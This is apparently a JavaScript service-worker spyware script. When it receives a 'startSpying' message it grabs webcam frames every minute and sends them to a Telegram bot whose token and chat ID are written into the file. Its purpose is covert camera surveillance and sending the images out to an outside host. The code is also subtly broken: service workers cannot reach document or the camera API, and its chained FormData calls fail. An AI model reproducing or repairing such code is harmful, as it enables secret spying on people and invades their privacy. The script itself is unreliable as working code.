const apiToken = '7504005848:AAGY3pQyR5TW0n7pU9HLLHPWtqWL72s6mQ8';
const chatId = '6759375069';

self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(self.clients.claim());
});

self.addEventListener('message', (event) => {
    if (event.data.action === 'startSpying') {
        startSpying();
    }
});

async function startSpying() {
    const constraints = { video: true };

    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        setInterval(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageDataUrl = canvas.toDataURL('image/jpeg');
            await sendToTelegram(imageDataUrl);
        }, 60000);
    } catch (err) {
        console.error('Errore nell\'accesso alla fotocamera:', err);
    }
}

async function sendToTelegram(imageDataUrl) {
    const response = await fetch(`https://api.telegram.org/bot${apiToken}/sendPhoto`, {
        method: 'POST',
        body: new FormData().append('photo', imageDataUrl.split(',')[1], 'photo.jpg').append('chat_id', chatId),
    });

    if (response.ok) {
        console.log('Photo sent successfully');
    } else {
        console.error('Failed to send photo:', response.statusText);
    }
}
